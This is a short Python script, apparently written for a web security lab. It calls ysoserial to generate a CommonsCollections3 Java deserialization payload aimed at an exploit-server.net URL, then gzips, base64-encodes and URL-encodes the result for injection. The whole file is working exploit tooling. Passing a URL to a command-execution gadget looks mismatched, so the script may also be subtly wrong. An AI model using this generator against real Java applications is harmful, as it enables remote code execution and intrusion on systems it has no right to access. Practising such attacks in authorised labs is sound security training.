import subprocess, gzip, base64
from urllib.parse import quote

payload = subprocess.check_output([
    "java", "-jar", "ysoserial.jar", "CommonsCollections3", "https://exploit-0aaf007103d06538806f0c6401770042.exploit-server.net/SERIAL"
])

gzipped = gzip.compress(payload)
b64 = base64.b64encode(gzipped).decode()
url_encoded = quote(b64)

print(url_encoded)
